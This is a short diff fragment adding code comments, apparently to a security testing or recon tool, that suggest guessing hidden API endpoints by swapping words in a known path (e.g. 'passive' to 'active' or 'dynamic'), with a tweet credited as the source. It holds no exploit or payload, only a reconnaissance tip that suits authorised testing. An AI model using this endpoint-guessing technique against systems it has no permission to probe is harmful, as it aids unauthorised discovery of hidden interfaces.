+  #       Find paths and the synonyms for them e.g. if a path states: /api/v1/p/passive?uuid=1
+  #         Try with: 
+  #           passive --> active
+  #           passive --> dynamic
+  #         Taken from: https://twitter.com/nullenc0de/status/1365037177109889028?s=12
